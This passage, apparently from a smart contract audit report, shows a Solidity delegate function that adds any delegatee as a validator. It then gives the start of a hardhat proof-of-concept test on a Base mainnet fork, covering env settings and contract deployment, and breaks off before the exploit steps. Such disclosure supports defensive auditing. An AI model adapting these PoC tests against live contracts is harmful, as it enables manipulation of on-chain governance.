data-language=\"solidity\" data-index=\"84\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edelegate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estakingTokenToVirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddValidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_delegate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"proof-of-concept-14\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eThe test case below was ran using a base mainnet fork, please add the same to the \u003ccode\u003ehardhat.config.js\u003c/code\u003e file. The hardhat version wasn’t supporting the base mainnet fork, so it had to be upgraded:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"85\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u0026quot;hardhat\u0026quot;: \u0026quot;^2.23.0\u0026quot;,\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAdd the following values to the \u003ccode\u003e.env\u003c/code\u003e file (along with private keys):\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"86\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Genesis DAO settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eGENESIS_VOTING_DELAY=0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eGENESIS_VOTING_PERIOD=900\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eGENESIS_PROPOSAL_THRESHOLD=0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Virtual DAO settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_VOTING_DELAY=0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_VOTING_PERIOD=900\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_PROPOSAL_THRESHOLD=1000000000000000000000000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_QUORUM_NUMERATOR=1000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Other settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eCHAIN_ID=84532\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVIRTUAL_APPLICATION_THRESHOLD=50000000000000000000 # 50\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVIRTUAL_APPLICATION_THRESHOLD_VIP=125000000000000000000 #125 $V\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMATURITY_DURATION=1000 # number of blocks until initial virtual staker can withdraw (1000 blocks = ~33 minutes)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### AgentToken settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_SUPPLY=1000000000 # 1B supply\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LIMIT_TRX=100000 # 100k max token per txn\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LIMIT_WALLET=1000000 # 1M token per wallet\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LP_SUPPLY=1000000000 # 1B LP tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LIMIT=1000000000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_VAULT_SUPPLY=0 #\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eBOT_PROTECTION=3600 # 1hr\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTAX=100 # 3%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eBONDING_TAX=1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eSWAP_THRESHOLD=1 # 0.00001% of total supply\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### VOTING_TOKEN=\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTBA_REGISTRY=\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Reward settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePARENT_SHARES=2000 # 20%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_SHARES=1000 # 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eCONTRIBUTOR_SHARES=5000 # 50%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eSTAKER_SHARES=9000 # 90%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eREWARD_STAKE_THRESHOLD=2000000000000000000 # 2 eth\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eDATASET_SHARES=7000 # 70%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### TAX MANAGER\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMIN_SWAP_THRESHOLD=100000000000000000 # 0.1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMAX_SWAP_THRESHOLD=1000000000000000000000 # 1000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eUNISWAP_ROUTER=0x4752ba5dbc23f44d87826276bf6fd6b1c372ad24\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCreate a file called \u003ccode\u003ePoC.js\u003c/code\u003e and add the following test case inside the \u003ccode\u003e/tests\u003c/code\u003e folder and run \u003ccode\u003enpx hardhat test --grep \"Delegate a non-validator\"\u003c/code\u003e:\u003c/p\u003e\n\u003cdetails\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"87\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { parseEther, toBeHex, formatEther } = require(\u0026quot;ethers/utils\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { expect } = require(\u0026quot;chai\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  loadFixture,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  mine,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  impersonateAccount,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  setBalance,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e} = require(\u0026quot;@nomicfoundation/hardhat-toolbox/network-helpers\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { ethers } = require(\u0026quot;hardhat\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003edescribe(\u0026quot;AgentFactory\u0026quot;, () =\u0026gt; {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const PROPOSAL_THRESHOLD = parseEther(\u0026quot;50000\u0026quot;); // 50k\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const MATURITY_SCORE = toBeHex(2000, 32); // 20%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const IP_SHARE = 1000; // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const genesisInput = {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    name: \u0026quot;Jessica\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    symbol: \u0026quot;JSC\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    tokenURI: \u0026quot;http://jessica\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    daoName: \u0026quot;Jessica DAO\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    cores: [0, 1, 2],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    tbaSalt:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;0xa7647ac9429fdce477ebd9a95510385b756c757c26149e740abbab0ad1be2f16\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    tbaImplementation: process.env.TBA_IMPLEMENTATION || ethers.ZeroAddress,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    daoVotingPeriod: 600,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    daoThreshold: 1000000000000000000000n,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  const getAccounts = async () =\u0026gt; {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const [deployer, ipVault, founder, poorMan, trader, treasury, randomAddr] = await ethers.getSigners();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Fund all accounts with ETH for gas (10 ETH each)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const fundAccounts = [deployer, ipVault, founder, poorMan, trader, treasury];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    for (const account of fundAccounts) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await setBalance(account.address, parseEther(\u0026quot;10\u0026quot;));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return { deployer, ipVault, founder, poorMan, trader, treasury, randomAddr };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  async function deployBaseContracts() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { deployer, ipVault, treasury } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Setting up environment variables if not present in the actual .env\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // This is for testing purposes only\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.TBA_IMPLEMENTATION) process.env.TBA_IMPLEMENTATION = ethers.ZeroAddress;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.DATASET_SHARES) process.env.DATASET_SHARES = \u0026quot;1000\u0026quot;; // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.UNISWAP_ROUTER) process.env.UNISWAP_ROUTER = \u0026quot;0x8aEF2b5C33686F8621A17B9Aaff079E7d8D673f9\u0026quot;; // Base mainnet Uniswap router\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.AGENT_TOKEN_LIMIT) process.env.AGENT_TOKEN_LIMIT = parseEther(\u0026quot;10000000\u0026quot;).toString(); // 10M\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.AGENT_TOKEN_LP_SUPPLY) process.env.AGENT_TOKEN_LP_SUPPLY = parseEther(\u0026quot;5000000\u0026quot;).toString(); // 5M\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.AGENT_TOKEN_VAULT_SUPPLY) process.env.AGENT_TOKEN_VAULT_SUPPLY = parseEther(\u0026quot;2000000\u0026quot;).toString(); // 2M\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.BOT_PROTECTION) process.env.BOT_PROTECTION = \u0026quot;100\u0026quot;; // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.TAX) process.env.TAX = \u0026quot;500\u0026quot;; // 5%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.SWAP_THRESHOLD) process.env.SWAP_THRESHOLD = parseEther(\u0026quot;10\u0026quot;).toString(); // 10 tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying VirtualToken...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const virtualToken = await ethers.deployContract(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;VirtualToken\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [PROPOSAL_THRESHOLD, deployer.address],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`VirtualToken deployed at ${virtualToken.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying ERC6551Registry Registry\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tbaRegistry = await ethers.deployContract(\u0026quot;ERC6551Registry\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await tbaRegistry.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deployed ERC6551Registry Registry\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentNftV2...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const AgentNft = await ethers.getContractFactory(\u0026quot;AgentNftV2\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentNft = await upgrades.deployProxy(AgentNft, [deployer.address]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentNftV2 deployed at ${agentNft.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying ContributionNft...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const contribution = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;ContributionNft\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [agentNft.target],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`ContributionNft deployed at 